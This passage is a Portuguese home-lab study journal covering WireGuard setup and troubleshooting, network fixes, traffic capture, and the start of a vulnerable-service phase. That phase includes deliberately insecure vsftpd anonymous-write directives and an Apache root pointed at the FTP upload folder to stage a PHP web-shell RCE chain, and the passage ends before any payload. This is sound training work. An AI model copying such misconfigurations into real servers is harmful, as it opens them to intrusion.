Security+ D3 (Arquitetura de Segurança — VPN, criptografia), Security+ D1 (Conceitos Gerais — princípio do menor privilégio), CEH D9 (Criptografia), ISO/IEC 27001 A.8.24 (Uso de criptografia), NIS2 (gestão de chaves e controlo de acesso).

### Próximos passos
Criar o ficheiro de configuração da interface WireGuard (`/etc/wireguard/wg0.conf`) no Ubuntu Desktop, usando a chave privada gerada, e depois repetir a geração de chaves no lado do cliente (Windows 11).

---

## Entrada #53 — Configuração do cliente WireGuard (Windows 11) — túnel estabelecido mas sem handshake, causa ainda em aberto
**Data/hora:** 2026-08-22
**Máquinas ligadas:** OPNsense (`192.168.10.254`), Ubuntu Desktop (servidor WireGuard, `192.168.10.20` / `10.10.10.1` na VPN), Windows 11 (cliente, `192.168.10.100` / `10.10.10.2` na VPN)

### Objetivo / Propósito
Configurar o Windows 11 como cliente WireGuard, ligando-o ao servidor já ativo no Ubuntu Desktop, e confirmar que o túnel estabelece ligação real (handshake) antes de avançar para a validação de tráfego cifrado com o Kali.

### Ação executada
1. No Windows 11, aberta a app oficial do WireGuard — bloqueada inicialmente por restrição de privilégios ("só pode ser usado por membros do grupo Administradores"); resolvido ao iniciar sessão com uma conta de administrador (confirmado antes via `whoami /groups`, que mostrou a conta normal sem esse grupo).
2. Criado túnel vazio (`wg-lab`) — a app gera automaticamente o par de chaves do cliente (diferente do processo manual em duas ferramentas no Linux: `wg genkey` + `wg pubkey`).
3. Configurado `[Interface]` com `Address = 10.10.10.2/24` (após corrigir um erro de digitação, um ponto a mais antes da barra: `10.10.10.2./24`).
4. Configurado `[Peer]` com a chave pública do servidor, `Endpoint = 192.168.10.20:51820` e `AllowedIPs = 10.10.10.0/24`, transcrita à mão (sem copy/paste disponível entre host e VM) e confirmada carácter a carácter.
5. Do lado do servidor (Ubuntu Desktop), adicionado o `[Peer]` correspondente ao `wg0.conf`, com a chave pública do cliente e `AllowedIPs = 10.10.10.2/32`; interface recarregada com `wg-quick down/up`.
6. Túnel ativado no Windows 11. Testado `ping 10.10.10.1` (falhou, 100% perda) e confirmada rede física básica em paralelo (`ping 192.168.10.20` do Windows 11, sucesso total — descarta problema de rede geral).
7. Diagnóstico em camadas no servidor: `sudo wg show wg0` (sem "latest handshake" — pacote nunca reconhecido), `sudo ufw status verbose` (regra `51820/udp ALLOW IN` ativa), `sudo ss -ulnp | grep 51820` (processo à escuta, confirmado), `sudo tcpdump -i enp0s18 -n udp port 51820` (**pacote do cliente chega mesmo à placa de rede**, tamanho 148 bytes, compatível com um pacote de handshake), comparação de hora (`date` vs `Get-Date`, sem desvio relevante).
8. Tentativa de ativar registo de depuração do módulo do kernel (`echo 'module wireguard +p' | sudo tee /sys/kernel/debug/dynamic_debug/control`), precedida por `sudo modprobe -r wireguard` — **erro meu (Claude) neste passo**: o comando removeu o módulo do kernel enquanto a interface `wg0` estava ativa, destruindo-a por completo (`ip a show wg0` passou a dar "Device does not exist").

### Resultado
**Ainda não há handshake bem-sucedido.** Isolámos o problema com precisão: não é rede física, não é firewall, não é o processo estar à escuta, não é desvio de relógio — o pacote de handshake do cliente chega ao servidor e é rejeitado silenciosamente (comportamento normal do protocolo WireGuard quando a verificação criptográfica do pacote falha, sem gerar erro visível). A causa exata dessa rejeição fica por confirmar — ficou pendente porque o comando de diagnóstico usado para o apurar (ativar debug do módulo) destruiu acidentalmente a interface do servidor a meio do processo. Interface reposta com `wg-quick up wg0` no fim desta sessão de trabalho.

### Deduções e raciocínio
O tcpdump foi o passo mais valioso desta investigação: confirmou que o problema não está na camada de rede/routing/firewall (todas hipóteses razoáveis, todas descartadas uma a uma), mas sim dentro do próprio processo criptográfico do WireGuard — o pacote chega, mas não é aceite. As causas mais prováveis para uma rejeição silenciosa deste tipo (a confirmar na próxima sessão): a chave pública do servidor configurada no `[Peer]` do cliente não corresponder de facto à chave privada carregada no servidor (apesar da transcrição visual ter parecido correta), ou um erro subtil na configuração do lado do servidor que não é detetado pelo `wg show` (que só mostra o que foi interpretado, não valida a correspondência real das chaves).

**Lição adicional, sobre o meu próprio erro:** ao pedir para desativar um módulo do kernel para ativar debug, devia ter verificado primeiro se isso não ia derrubar um serviço já ativo — o comando certo teria sido ativar o debug sem tentar remover o módulo (que já estava carregado e em uso), já que o `dynamic_debug/control` não exige a remoção do módulo para funcionar.

### Consigo explicar isto a alguém?
Em progresso — a parte de "isolar por camadas" (rede → firewall → processo → protocolo) já consigo explicar por palavras próprias e foi o raciocínio mais útil desta sessão. A causa final da rejeição do handshake ainda não está confirmada, por isso essa parte fica em aberto, sem forçar uma explicação que não tenho a certeza que esteja correta.

### Como nos podemos defender
Não aplicável no sentido ofensivo/defensivo habitual (isto é troubleshooting de configuração, não exploração de vulnerabilidade) — mas o princípio de **isolar um problema por camadas antes de avançar para a mais complexa** (rede física → firewall → processo → protocolo) é uma competência de diagnóstico transferível para qualquer investigação de segurança, incluindo deteção de intrusões.

### Domínios relacionados
Security+ D3 (Arquitetura de Segurança — VPN, troubleshooting de rede), CEH D9 (Criptografia), A+ Core 2 D2 (Segurança e resolução de problemas de rede).

### Próximos passos
Repor a interface do servidor (`wg-quick up wg0`), confirmar as chaves em ambos os lados sem as voltar a transcrever à mão (se possível, resolver o problema de clipboard entre host e VMs primeiro, já identificado como pendência separada), e repetir o teste de handshake com debug ativo (sem remover o módulo desta vez).

---

## Entrada #54 — Túnel WireGuard estabelecido com sucesso — causa da falha anterior contornada, não confirmada ao detalhe
**Data/hora:** 2026-08-22
**Máquinas ligadas:** OPNsense (`192.168.10.254`), Ubuntu Desktop (servidor WireGuard, `192.168.10.20` / `10.10.10.1`), Windows 11 (cliente, `192.168.10.100` / `10.10.10.2`)

### Objetivo / Propósito
Resolver a falha de handshake documentada na Entrada #53 ("Invalid handshake initiation" persistente, apesar de firewall, processo e relógio confirmados corretos) e conseguir o primeiro túnel VPN funcional do lab.

### Ação executada
1. Confirmado por `dmesg` (com `dynamic_debug` do módulo `wireguard` ativo) que o servidor rejeitava sistematicamente o pacote de handshake do cliente com "Invalid handshake initiation", mesmo depois de reconfirmar a chave pública do servidor no cliente carácter a carácter (three revisões manuais, incluindo verificação da posição do espaço à volta do `=`) — sem encontrar diferença visível.
2. Decisão de eliminar a transcrição manual da equação por completo, em vez de continuar a tentar detetar o erro a olho: gerado um **novo par de chaves para o cliente diretamente no Ubuntu Desktop** (`wg genkey` / `wg pubkey`), e construído um ficheiro `cliente-wg.conf` completo (com a chave pública do servidor inserida por variável de shell, nunca escrita à mão).
3. Servidor atualizado com o novo peer (chave pública do novo cliente), reiniciando a interface `wg0`.
4. Ficheiro `cliente-wg.conf` publicado através de um servidor web temporário (`python3 -m http.server 8000`) no Ubuntu Desktop, e descarregado diretamente no browser do Windows 11 — evitando qualquer cópia manual de texto entre host e VMs (limitação já conhecida de clipboard).
5. Necessário abrir a porta `8000/tcp` na firewall (`ufw`) do Ubuntu Desktop para o download funcionar (só tínhamos aberto `22/tcp` e `51820/udp` antes).
6. Túnel importado no Windows 11 via "Importar túnel(es) do arquivo" (sem digitação nenhuma) e ativado.
7. Testado `ping 10.10.10.1` a partir do Windows 11: sucesso total (0% perda). Confirmado do lado do servidor com `sudo wg show wg0`: "latest handshake" registado, tráfego transferido em ambos os sentidos.

### Resultado
Túnel WireGuard funcional entre Ubuntu Desktop (servidor) e Windows 11 (cliente). **A causa exata da falha original (Entrada #53) não ficou confirmada** — não foi possível determinar se era mesmo um erro de transcrição impercetível a olho nu, ou outra causa qualquer ligada ao processo de escrita manual na app do WireGuard para Windows. A solução adotada contorna o problema (elimina a transcrição manual), mas não o diagnostica ao detalhe — registo honesto de uma limitação de investigação, não de compreensão do mecanismo em si (o mecanismo do handshake e da rejeição por MAC1 inválido está compreendido; a causa específica desta instância de erro, não).

### Deduções e raciocínio
Quando um processo de verificação manual e repetido (três revisões, com ditado carácter a carácter) não encontra o erro que sabemos existir, o problema deixa de ser "ver melhor" e passa a ser "não confiar no método". A decisão certa foi mudar de abordagem — eliminar a fonte de erro possível (transcrição manual) em vez de insistir em repeti-la à espera de um resultado diferente. Isto tem paralelo direto com o princípio de segurança de "eliminar a superfície de erro" em vez de "tentar acertar sempre" — por exemplo, o mesmo raciocínio por trás de usar gestores de password em vez de digitar passwords complexas de memória.

### Consigo explicar isto a alguém?
Sim, a parte da solução — "quando não consigo confiar na minha própria verificação manual, a solução correta é eliminar essa etapa manual da equação, não repeti-la com mais atenção". A causa exata da falha original fica sem explicação confiante, e prefiro registar isso do que inventar uma certeza que não tenho.

### Como nos podemos defender
Não aplicável no sentido ofensivo/defensivo (troubleshooting de configuração) — mas o princípio de "transferir segredos por canais automatizados em vez de transcrição manual" é diretamente relevante em segurança real: é exatamente a razão pela qual gestores de chaves SSH, certificados e cofres de segredos (ex.: HashiCorp Vault) existem — a transcrição manual de material criptográfico é uma fonte de erro humano reconhecida na indústria.

### Domínios relacionados
Security+ D3 (Arquitetura de Segurança — VPN, gestão de chaves), CEH D9 (Criptografia), A+ Core 2 D2 (Segurança e resolução de problemas de rede).

### Próximos passos
Reverter as portas temporárias já não necessárias (`8000/tcp` no `ufw`), parar o servidor web temporário, e avançar para o último passo da Fase 3: usar o Kali para capturar o tráfego entre as duas VMs com Wireshark/tcpdump e confirmar visualmente que o conteúdo dos pacotes está cifrado (ilegível), fechando a fase.

---

## Entrada #55 — Correção do IP do OPNsense e resolução de conflito de DHCP (registo retroativo, antes das Entradas #52–#54)
**Data/hora:** 2026-08-22 (cronologicamente antes das Entradas #52–#54, arrancando a Fase 3)
**Máquinas ligadas:** OPNsense, Ubuntu Desktop

### Objetivo / Propósito
Antes de arrancar o WireGuard, foi preciso desbloquear a VM Ubuntu Desktop (que não tinha rede) e confirmar que a topologia de rede do lab batia certo com o que estava planeado no roteiro — nomeadamente o IP do gateway OPNsense e a ausência de conflitos de IP entre máquinas.

### Ação executada
1. Diagnosticado que a interface de rede do Ubuntu Desktop (`enp0s18`) estava com ligação NetworkManager "desligada" apesar do link físico estar ativo — resolvido com `nmcli connection up enp0s18` e configurado `autoconnect yes` para não se perder outra vez.
2. Testado o acesso à interface web do OPNsense (`https://192.168.10.254`) — falhou. Diagnóstico por `ping` confirmou "Destination Host Unreachable", sugerindo que o gateway não estava mesmo nesse endereço.
3. Verificado diretamente na consola de texto do OPNsense: o LAN (`em0`) estava configurado em `192.168.10.1/24`, não `192.168.10.254/24` como o roteiro do projeto sempre assumiu (o roteiro já tinha uma nota antiga a admitir esta possibilidade: "IP a confirmar, pode conflituar com gateway").
4. Corrigido via consola de texto (opção "2) Set interface IP address"), passo a passo: desativado DHCP na LAN, definido `192.168.10.254/24`, mantido DHCP server ativo, redefinido o intervalo dinâmico para `192.168.10.100`–`192.168.10.200` (deixando os endereços baixos livres para reservas fixas), mantido acesso HTTPS à webGUI.
5. Confirmado o novo IP na consola (`LAN (em0) -> v4: 192.168.10.254/24`) e sucesso de ping/HTTPS a partir do Ubuntu Desktop.
6. Detetado um segundo problema: o Ubuntu Desktop continuava a receber `192.168.10.10` por DHCP mesmo depois da mudança de intervalo — investigado via **Services → ISC DHCPv4 → Leases** no OPNsense, que revelou uma reserva estática (**DHCP Static Mapping**) já existente para o MAC desta VM, fixando-a nesse endereço antigo.
7. Editada essa reserva estática para `192.168.10.20` (mantendo-a como reserva fixa, por ser o servidor WireGuard) e aplicadas as alterações. Confirmado com renovação do IP (`nmcli connection down/up`) que o Ubuntu Desktop passou a ter `192.168.10.20` de forma estável.

### Resultado
OPNsense com o LAN corretamente em `192.168.10.254/24`, como o roteiro sempre pretendeu. Ubuntu Desktop com IP fixo `192.168.10.20` (via reserva DHCP), sem conflito com o Kali (`192.168.10.102`, DHCP dinâmico). Roteiro atualizado com a topologia de rede final.

### Deduções e raciocínio
O sintoma inicial ("não abre a página do OPNsense") tinha várias causas possíveis (rede física, DNS, firewall, protocolo), mas o diagnóstico em camadas (`ping` primeiro, depois consola direta da VM) apontou rapidamente para a causa real: uma suposição desatualizada sobre o próprio endereço do gateway, nunca verificada diretamente até este momento. A reserva DHCP escondida (só visível numa secção separada da página de configurações, não onde se esperaria) reforça a lição já vista noutras entradas: a interface de gestão de uma ferramenta nem sempre mostra tudo no sítio mais óbvio — vale a pena explorar todas as secções antes de concluir que "não há nada configurado".

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "o router (OPNsense) estava configurado com um IP diferente do que o resto da documentação do projeto assumia; corrigi para o valor correto e, de caminho, encontrei uma reserva de rede escondida que estava a causar um conflito de IP entre duas máquinas."

### Como nos podemos defender
Não aplicável no sentido ofensivo/defensivo — é gestão de infraestrutura de rede, não uma vulnerabilidade explorável. Lição transferível: documentação (o roteiro) e realidade (a configuração viva) podem divergir silenciosamente — vale a pena confirmar por observação direta em vez de confiar cegamente em notas anteriores, mesmo as próprias.

### Domínios relacionados
Security+ D3 (Arquitetura de Segurança — endereçamento IP, DHCP), A+ Core 1 D2 (Redes), NIS2/ISO 27001 (gestão de configuração e documentação de ativos de rede).

### Próximos passos
Com a rede estável e sem conflitos, arrancar o WireGuard (Entradas #52–#54).

---

## Entrada #56 — Captura de tráfego no Kali confirma cifra do túnel WireGuard. FECHA A FASE 3
**Data/hora:** 2026-08-22
**Máquinas ligadas:** OPNsense (`192.168.10.254`), Ubuntu Desktop (servidor WireGuard, `192.168.10.20`), Windows 11 (cliente, `192.168.10.100`), Kali Linux (`192.168.10.102`, observador)

### Objetivo / Propósito
Último passo da Fase 3: confirmar, por observação direta do tráfego de rede (não só pela ligação funcionar), que o WireGuard está mesmo a cifrar os dados que passam entre o Ubuntu Desktop e o Windows 11 — a diferença entre "a VPN liga" e "a VPN protege".

### Ação executada
1. Corrigida a rede do Kali antes de começar: a VM tinha voltado à rede errada (`192.168.1.50/24`, a mesma falha já documentada antes), resolvido confirmando o adaptador de rede na definição da VM (LAN segment "Ciber") e renovando o IP (`sudo dhclient eth0`), resultando em `192.168.10.102/24`.
2. Testado se o Kali conseguia ver tráfego alheio (entre Ubuntu Desktop e Windows 11, nenhum dos dois é o Kali) com `sudo tcpdump -i eth0 -n udp port 51820`, gerando tráfego com `ping 10.10.10.1` a partir do Windows 11. **Resultado inesperado e positivo:** o Kali viu o tráfego sem qualquer configuração extra de modo promíscuo — a rede virtual "Ciber" do VMware está a comportar-se como um hub (entrega a todos os membros do segmento), não como um switch fechado.
3. Repetida a captura com `sudo tcpdump -i eth0 -n udp port 51820 -X -c 5`, desta vez a mostrar o conteúdo dos pacotes em hexadecimal/ASCII, não só os cabeçalhos.

### Resultado
Os 5 pacotes capturados mostram exatamente o padrão esperado de um túnel real: tamanhos de pacote coerentes com pings do Windows (mensagens de handshake maiores, depois pacotes de dados de tamanho fixo a cada pedido/resposta de ping), mas o **conteúdo é ruído criptográfico sem qualquer padrão legível** — nem o texto típico de um payload de ping do Windows (a sequência alfabética `abcdefghij...`) é visível, o que seria imediatamente visível se o tráfego não estivesse cifrado.

### Deduções e raciocínio
A prova de que uma VPN está a funcionar não é só "o ping passa" — isso confirma só a conectividade, não a confidencialidade. A prova real exige mostrar que um observador de rede bem posicionado (aqui, o Kali, com uma visão inesperadamente ampla do segmento) não consegue extrair nada de útil do conteúdo, mesmo sabendo exatamente que tipo de tráfego está a acontecer (ping, com tamanho e timing previsíveis). Isto fecha o ciclo conceptual do módulo: os metadados (quem fala com quem, quanto, e quando) continuam visíveis mesmo com VPN — só o conteúdo fica protegido. É uma limitação real e conhecida de qualquer VPN, não só do WireGuard.

**Achado lateral relevante:** o comportamento tipo "hub" da rede virtual "Ciber" (o Kali vê tráfego alheio sem esforço) é, ele próprio, uma lição de segurança de rede — em produção, uma rede corretamente segmentada com switches reais isolaria esse tráfego por padrão, exigindo um ataque ativo (ARP spoofing, port mirroring comprometido) para o atacante conseguir a mesma visibilidade que aqui veio de borla.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "capturei o tráfego entre duas máquinas com uma terceira, de fora dessa conversa, e confirmei que, apesar de ver perfeitamente que estavam a comunicar e com que padrão, o conteúdo em si era ilegível — isso é a prova de que a VPN está a cifrar de verdade, e não só a fazer de conta que liga."

### Como nos podemos defender
Do lado de quem defende uma rede: nunca assumir que "está numa rede interna" é suficiente — a captura mostrou que até tráfego dentro do próprio lab isolado pode ser visto por uma máquina não autorizada, se a segmentação de rede (VLANs, switches com portas isoladas, modo promíscuo desligado) não for garantida. A VPN protege o conteúdo mesmo quando a segmentação de rede falha — daí o valor de usar cifra ponta-a-ponta mesmo dentro de redes "de confiança".

### Domínios relacionados
Security+ D3 (Arquitetura de Segurança — VPN, segmentação de rede), CEH D9 (Criptografia), CEH D6/D7 (Sniffing, Ataques a Redes Sem Fio/Rede), A+ Core 2 D2 (Segurança de rede).

### Próximos passos
**Fase 3 concluída.** Avançar para a Fase 4 do roteiro (exploração de rede/serviços com Metasploitable), ou para a Fase 5 (Windows Server, hardening, deteção — Wazuh), conforme prioridade a decidir.

---

## Entrada #57 — Início da Fase 4: recuperação da VM "Servidor Vulnerável" e decisão de instalação manual (não-Docker)
**Data/hora:** 2026-08-22
**Máquinas ligadas:** Servidor Vulnerável (VMware, host Linux Mint)

### Objetivo / Propósito
Arrancar a Fase 4 do roteiro (exploração de rede/serviços), reaproveitando a VM "Servidor Vulnerável" já existente (que corre DVWA em Docker) em vez de criar uma VM Metasploitable dedicada — e decidir, antes de instalar seja o que for, se os novos serviços vulneráveis desta fase seriam instalados em contentores Docker (como o DVWA) ou diretamente no sistema operativo da VM.

### Ação executada
1. Ao tentar ligar a VM "Servidor Vulnerável" ("Ubuntu server LAB-segurança"), surgiu o erro `Unable to change virtual machine power state... Cannot open the disk '.../Ubuntu server LAB-segurança-000001.vmdk'... Module 'Disk' power on failed.`
2. Diagnosticado na pasta da VM, no host (`ls -la`), a presença de três diretórios de bloqueio (`.lck`): `Ubuntu server LAB-segurança-000001.vmdk.lck`, `Ubuntu server LAB-segurança.vmdk.lck` e `Ubuntu server LAB-segurança.vmx.lck` — sinal típico de um encerramento anterior mal feito da VM. Confirmado com `df -h /home` que não era falta de espaço em disco (104G livres).
3. Confirmado com `ps aux | grep -i "LAB-segurança"` que nenhum processo real estava a usar esses ficheiros de bloqueio (ou seja, eram resíduos, não bloqueios ativos e legítimos).
4. Removidos os três diretórios `.lck` com `rm -rf`. A VM arrancou com sucesso.
5. Confirmada rede funcional dentro da VM: `ping -c 3 192.168.10.254` (gateway OPNsense) com 0% de perda de pacotes, hostname da VM confirmado como `lab-seguranca`.
6. Discutida a abordagem para os serviços vulneráveis desta fase: reaproveitar o padrão Docker já usado no DVWA (rápido, isolado, fácil de repor) ou instalar manualmente serviços antigos/mal configurados diretamente no sistema operativo (mais lento, mas mais fiel a um cenário real e mais didático a nível de configuração de sistema). **Decisão: opção B — instalação manual, não-Docker.**

### Resultado
VM "Servidor Vulnerável" operacional, com rede confirmada. Fase 4 iniciada com a decisão tomada de instalar os serviços vulneráveis diretamente no sistema operativo (sem contentores).

### Deduções e raciocínio
A falha de arranque da VM foi uma causa nova, distinta das duas já vistas com o VMware nesta sessão (módulos de kernel em falta, permissões `640` nos ficheiros de índice de módulos): desta vez o problema não estava no VMware Workstation em si, mas em ficheiros de bloqueio (`.lck`) órfãos, deixados por um encerramento anterior da VM que não correu como devia (por exemplo, um encerramento forçado do host). O `ps aux` foi o passo de confirmação decisivo — sem ele, apagar os `.lck` às cegas seria arriscado, porque um processo VMware ainda ativo a usar o disco tornaria essa remoção perigosa (corrupção do disco virtual). Só depois de confirmar "não há ninguém a usar isto" é que a remoção foi seguraa.

Quanto à decisão Docker vs. instalação manual: um contentor Docker isola o serviço vulnerável do resto do sistema operativo, o que é ótimo para rapidez e para repor o ambiente rapidamente (como foi feito com o DVWA), mas esconde uma parte importante da aprendizagem — como um serviço realmente fica mal configurado ao nível do sistema operativo (ficheiros de configuração, permissões, versões de pacotes, utilizadores de sistema). Como o objetivo deste lab é sempre a compreensão passo a passo (e não só "ver o exploit funcionar"), a instalação manual foi escolhida por valor didático, mesmo sendo mais trabalhosa e com maior risco de ser preciso repor a VM manualmente se algo correr mal (ao contrário de um simples `docker rm` no caso do Docker).

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "a VM não arrancava por causa de ficheiros de bloqueio esquecidos de uma vez anterior que não fechei bem; apaguei-os depois de confirmar que nada estava mesmo a usá-los. E para a próxima fase, decidi instalar os serviços vulneráveis a sério no sistema, em vez de usar contentores, porque quero perceber a configuração por dentro, não só correr um exploit contra uma caixa pronta."

### Como nos podemos defender
Lição de higiene operacional, não de segurança ofensiva/defensiva propriamente dita: encerrar sempre as VMs de forma limpa (não desligar o host ou forçar o encerramento com a VM ligada) evita este tipo de ficheiro de bloqueio órfão. Em ambientes de produção com hipervisores, o equivalente é garantir desligamentos controlados e monitorizar ficheiros de lock esquecidos antes de os remover às cegas.

### Domínios relacionados
A+ Core 1 D2/D4 (Virtualização, resolução de problemas), Security+ D4 (Operações de Segurança — gestão de configuração e ambientes de teste).

### Próximos passos
Escolher e instalar o primeiro serviço vulnerável "a sério" (candidato inicial: um FTP antigo tipo `vsftpd 2.3.4`, com vulnerabilidade clássica bem documentada), depois enumeração com `nmap` e exploração com Metasploit, conforme o roteiro da Fase 4.

---

## Entrada #58 — Descoberta: o host está isolado da rede "Ciber" por design (rede do tipo Private Network), Kali confirmado como único ponto de acesso
**Data/hora:** 2026-08-22
**Máquinas ligadas:** Servidor Vulnerável, Kali, host (Linux Mint)

### Objetivo / Propósito
Ligar por SSH à VM "Servidor Vulnerável" para facilitar o trabalho (copiar/colar comandos em vez de escrever na janela da VM). A primeira tentativa foi feita a partir do host, e falhou — o diagnóstico acabou por revelar algo estrutural sobre a arquitetura de rede do lab.

### Ação executada
1. Tentado `ssh pedro@192.168.10.101` a partir do terminal do host — falhou com `No route to host`.
2. Confirmado dentro da própria VM que a rede estava bem: `ip a` mostrou o IP correto (`192.168.10.101/24` em `ens33`), SSH ativo (`systemctl status ssh`), e `ping` ao gateway OPNsense (`192.168.10.254`) com 0% de perda.
3. Testado do lado do host: `ip a` e `ip route` revelaram que o host tem uma interface própria `vmnet3` com IP `192.168.10.1/24` — à partida, na mesma rede. Mas `ping -c 3 192.168.10.101` a partir do host devolveu `Destination Host Unreachable` (falha de resolução ARP, não um simples "porta fechada").
4. Inspecionado o ficheiro `.vmx` da VM "Servidor Vulnerável" (`grep -i "ethernet0\." ...vmx`), revelando `ethernet0.connectionType = "pvn"` — um tipo de rede "Private Network" (funcionalidade mais recente do VMware Workstation), diferente das redes "Custom" clássicas (`vmnet0`–`vmnet9`). Uma rede deste tipo isola-se do host por definição — não cria um adaptador correspondente no host, ao contrário de uma rede custom clássica. O `vmnet3` visto no host é uma rede diferente (coincidência de intervalo de IP, não o mesmo segmento).
5. Testado o mesmo `ping` e `ssh` a partir do Kali (que está dentro do segmento "Ciber"): ambos funcionaram de imediato, com o SSH a completar a autenticação e o login com sucesso.

### Resultado
Confirmado: o host (Linux Mint) não tem, nem pode ter por design, acesso direto à rede "Ciber" onde vivem as VMs do lab. O Kali é o único ponto de acesso funcional a essa rede — o que, de resto, corresponde exatamente ao papel que já lhe tinha sido atribuído desde o início do projeto ("máquina atacante").

### Deduções e raciocínio
Isto não é uma falha nem um bug — é uma característica do isolamento de rede que o próprio lab sempre pretendeu ("rede interna isolada, sem exposição pública"). A diferença é que a fronteira de isolamento não é só entre o lab e a Internet — é também entre o lab e o próprio computador físico que o aloja. Isso reforça, sem ambiguidade, que qualquer interação com as VMs do segmento "Ciber" (enumeração, exploração, ligação SSH de conveniência) tem de partir de dentro do próprio lab — ou seja, do Kali — e nunca do host. É também um lembrete de que "estar na mesma gama de IPs" não implica "estar na mesma rede" — a arquitetura de virtualização por baixo pode isolar segmentos com o mesmo aspeto de endereçamento.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "tentei ligar-me à VM diretamente do meu computador, mas não consegui, porque a rede do lab foi propositadamente configurada como uma rede privada e isolada até do próprio computador que a aloja — só uma máquina que já esteja dentro dessa rede (o Kali) consegue lá chegar, o que aliás é o comportamento correto para um lab de segurança isolado."

### Como nos podemos defender
Do ponto de vista de arquitetura de rede, isto é o próprio princípio de defesa em ação: segmentação de rede que restringe o acesso mesmo a partir de sistemas fisicamente próximos (o host) — só quem já está dentro do perímetro correto consegue interagir com os ativos protegidos. É o mesmo princípio usado em ambientes reais para isolar redes de gestão, redes de laboratório, ou segmentos sensíveis de uma rede corporativa.

### Domínios relacionados
Security+ D3 (Arquitetura de Segurança — segmentação de rede, isolamento), A+ Core 1 D2 (Redes, virtualização de rede).

### Próximos passos
Usar sempre o Kali como ponto de partida para SSH, `nmap` e qualquer interação com o Servidor Vulnerável e restantes VMs do segmento "Ciber". Continuar a configuração do `vsftpd` com acesso anónimo mal configurado.

---

## Entrada #59 — Início da Fase 4: vsftpd instalado e configurado com acesso anónimo mal configurado, upload confirmado
**Data/hora:** 2026-08-22
**Máquinas ligadas:** Servidor Vulnerável, Kali

### Objetivo / Propósito
Configurar o primeiro serviço vulnerável da Fase 4 no Servidor Vulnerável, de forma manual (não em Docker, conforme decisão da Entrada #57): um servidor FTP (`vsftpd`) real e atual, mas deliberadamente mal configurado com acesso anónimo de escrita — um tipo de falha de configuração comum em auditorias reais.

### Ação executada
1. Instalado o `vsftpd` (versão `3.0.5-0ubuntu3.1`, atual, sem qualquer backdoor) via `sudo apt install -y vsftpd`. Serviço arrancou automaticamente (`systemctl status vsftpd` confirmou `active (running)`).
2. Editado `/etc/vsftpd.conf`, adicionando as diretivas: `anonymous_enable=YES`, `anon_upload_enable=YES`, `anon_mkdir_write_enable=YES`, `anon_other_write_enable=YES`, `write_enable=YES`, `no_anon_password=YES`.
3. Criada a pasta `/srv/ftp/upload`, com dono `ftp:ftp` e permissões `777` (escrita total).
4. Reiniciado o serviço (`sudo systemctl restart vsftpd`), sem erros.
5. Testado o acesso a partir do Kali (`ftp 192.168.10.101`), com utilizador `anonymous` e password vazia — login aceite (`230 Login successful`).
6. Enviado um ficheiro de teste (`put teste.txt upload/teste.txt`) — transferência completa (`226 Transfer complete`).
7. Confirmado do lado do servidor (via SSH) que o ficheiro chegou: `ls -la /srv/ftp/upload/` mostrou `teste.txt`, dono `ftp:ftp`, permissões `600`. O `cat` direto falhou por permissões (o `vsftpd` grava uploads anónimos com `600`, só o dono `ftp` pode ler), mas `sudo cat` confirmou o conteúdo exato enviado (`teste de upload anonimo`).

### Resultado
Servidor FTP funcional no Servidor Vulnerável, com acesso anónimo de escrita ativo e confirmado — um utilizador externo, sem qualquer credencial, consegue autenticar-se e escrever ficheiros no servidor.

### Deduções e raciocínio
Este processo tocou em dois achados secundários interessantes, para além da vulnerabilidade principal: primeiro, um "falso alarme" inicial (`421 Timeout`) que se revelou apenas o timeout de inatividade do `vsftpd` entre o utilizador e a password (por termos demorado a escrever), não um erro de configuração — uma lição sobre distinguir erros de infraestrutura de erros de timing/ritmo humano. Segundo, o facto de o `cat` falhar por permissões, mesmo com o upload confirmado por `ls -la`, é uma boa lição sobre a diferença entre "o ficheiro existe" e "eu consigo lê-lo" — o `vsftpd` aplica automaticamente um `600` restritivo aos uploads anónimos por segurança, mesmo quando a pasta em si está toda aberta (`777`); a vulnerabilidade real aqui é a possibilidade de escrever, não necessariamente de ler o que outros escreveram.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "configurei um servidor FTP real, mas deixei-o aceitar logins anónimos com permissão de escrita — depois, a partir de outra máquina (o Kali), consegui entrar sem senha nenhuma e enviar um ficheiro para o servidor, e confirmei do lado do servidor que o ficheiro chegou mesmo."

### Como nos podemos defender
Nunca ativar acesso anónimo de escrita em servidores FTP expostos — se for mesmo necessário acesso anónimo (por exemplo, para distribuição pública de ficheiros), deve ser só de leitura (`anon_upload_enable=NO`). Quando a escrita anónima é mesmo necessária por algum motivo específico, isolar bem a pasta de destino (sem ligação a outras partes sensíveis do sistema, como pastas servidas pela web) e monitorizar/limitar o espaço disponível para evitar abuso.

### Domínios relacionados
Security+ D2 (Arquitetura — configuração segura de serviços), Security+ D4 (Operações — hardening de serviços), CEH D4 (Enumeração de serviços de rede), A+ Core 2 D2 (Segurança).

### Próximos passos
Explorar a possibilidade de encadear esta falha com o servidor web do DVWA já existente na mesma VM (se a pasta do FTP anónimo coincidir, ou puder ser configurada para coincidir, com a pasta servida pelo Apache) — subir um ficheiro malicioso por FTP e executá-lo via pedido HTTP, demonstrando uma cadeia de ataque real. Depois, avançar para a enumeração formal com `nmap` a partir do Kali.

---

## Entrada #60 — Cadeia de ataque completa: FTP anónimo + Apache mal configurado = RCE via upload de web shell PHP
**Data/hora:** 2026-08-22
**Máquinas ligadas:** Servidor Vulnerável, Kali

### Objetivo / Propósito
Completar o cenário didático iniciado na Entrada #59: em vez de tratar o `vsftpd` mal configurado como uma falha isolada, encadeá-la com um segundo serviço (um servidor web) para demonstrar uma cadeia de ataque real — upload anónimo de um ficheiro malicioso, seguido da sua execução via um pedido HTTP normal.

### Ação executada
1. Verificado que o container Docker do DVWA não tinha `Mounts` (`docker inspect dvwa --format '{{json .Mounts}}'` devolveu `[]`) — ou seja, a raiz web do DVWA vive isolada dentro do próprio container, sem pasta correspondente no sistema operativo da VM. Decidido, por isso, montar um servidor web novo e independente (não em Docker) para a demonstração, em vez de tentar usar o DVWA.
2. Instalado `apache2` e `libapache2-mod-php` via `apt`. Falha inicial ao arrancar (`Address already in use: could not bind to address 0.0.0.0:80`), porque a porta 80 já estava ocupada pelo container do DVWA — resolvido mudando o Apache para a porta `8080` (`/etc/apache2/ports.conf` e `<VirtualHost *:8080>` em `000-default.conf`).
3. Configurado `DocumentRoot /srv/ftp/upload` no Apache — apontando a raiz web exatamente para a mesma pasta onde o FTP anónimo escreve.
